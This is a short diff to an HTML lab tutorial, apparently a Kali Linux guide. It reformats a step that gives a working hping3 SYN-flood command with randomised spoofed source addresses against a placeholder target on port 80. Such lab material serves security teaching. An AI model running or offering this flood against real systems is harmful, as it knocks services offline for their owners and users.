@@ -33,7 +33,7 @@
   <ol>
     <li><strong>Open a terminal on Kali:</strong> Your command center for the chaos to come.</li>
     <li><strong>Execute the attack:</strong> Unleash a torrent of SYN packets with this command:
-      <pre><code>sudo hping3 --count 1500 --data 120 --syn --flood -p 80 --rand-source target-IP (for example: 192.168.1.11) &lt;target_IP&gt;</code></pre>
+      <pre><code>sudo hping3 --count 1500 --data 120 --syn --flood -p 80 --rand-source &lt;target_IP&gt;</code></pre>(for example: 192.168.1.11)
     </li>
   </ol>
 
